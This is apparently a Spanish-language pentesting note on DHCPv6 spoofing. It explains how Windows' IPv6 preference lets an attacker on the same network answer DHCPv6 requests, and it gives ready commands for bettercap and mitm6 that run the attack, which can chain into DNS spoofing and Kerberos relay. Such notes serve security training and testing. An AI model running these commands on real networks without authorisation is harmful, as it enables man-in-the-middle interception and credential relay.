# Teoría

El protocolo #DHCPv6 (*Dynamic Host Configuration Protocol for IPv6*) permite la **asignación automática de configuración de red** a dispositivos IPv6, incluyendo sufijos de búsqueda DNS o los servidores DNS.

A diferencia de DHCPv4, DHCPv6 utiliza **comunicación multicast** (`ff02::1:2`).

![[dhcpv6.excalidraw|center]]

# Vulnerabilidad

Usualmente, IPv6 no se utiliza ni se configura, pero por defecto en entornos Windows, **IPv6 está habilitado y tiene prioridad sobre IPv4**.

Cuando una máquina Windows arranca o se conecta a la red, solicita una configuración IPv6 mediante una petición **DHCPv6**.

Dado que DHCPv6 funciona en multicast, **los atacantes en la misma red pueden intentar responder a las consultas DHCPv6 más rápido** y proporcionar a los clientes una configuración de red maliciosa.

![[dhcpv6-spoofing.excalidraw|center]]

Esta técnica es conocida como **DHCPv6 Spoofing** o **DHCPv6 Poisoning**.

# Explotación

>[!warning] DHCPv6 Spoofing puede causar disrupciones temporales en la red.
>Es altamente recomendado atacar máquinas específicas para minimizar el impacto en el entorno.

Es posible realizar el ataque **solamente encontrándose en la misma red**:

~~~tabs
tab: bettercap

<span query="codeBlock(_/variables/hacking.md/iface,_/variables/hacking.md/domain, code = # bettercap -iface {{iface}}&#10;&#10;set dhcp6.spoof.domains {{domain}}&#10;dhcp6.spoof on, lang = )"></span>
``` 
# bettercap -iface ${IFACE}

set dhcp6.spoof.domains ${DOMAIN}
dhcp6.spoof on
```
<span type="end"></span>


tab: mitm6

<span query="codeBlock(_/variables/hacking.md/iface,_/variables/hacking.md/domain, code = mitm6 -i {{iface}} -d {{domain}}, lang = )"></span>
``` 
mitm6 -i ${IFACE} -d ${DOMAIN}
```
<span type="end"></span>

>[!info] También realiza [[DNS Spoofing]]. No se puede desactivar.

~~~

## Ataques relacionados

-   [[DHCPv6 Spoofing]] → [[DNS Spoofing]] → Kerberos relay

# Recursos

~~~tabs

tab: Herramientas

| Repositorio                                          | Descripción                                                      |
| ---------------------------------------------------- | ---------------------------------------------------------------- |
| [`bettercap`](https://www.kali.org/tools/bettercap/) | Complete, modular, portable and easily extensible MITM framework |
| [`mitm6`](https://www.kali.org/tools/mitm6/)         | Pwning IPv4 via IPv6                                             |

~~~
